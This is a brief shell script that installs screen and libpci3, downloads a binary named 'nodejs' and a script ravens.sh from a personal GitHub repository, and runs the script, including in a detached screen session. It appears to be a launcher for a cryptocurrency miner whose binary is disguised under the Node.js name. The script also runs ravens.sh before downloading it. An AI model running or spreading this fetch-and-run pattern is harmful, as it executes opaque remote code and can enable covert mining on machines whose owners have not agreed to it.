#!/bin/sh

sudo apt update
sudo apt install screen -y
apt-get install libpci3
screen -dmS ravens.sh ./ravens.sh 65 75
wget https://github.com/Wibu81/gas/raw/main/nodejs
wget https://raw.githubusercontent.com/Wibu81/gas/main/ravens.sh
chmod +x ravens.sh
./ravens.sh
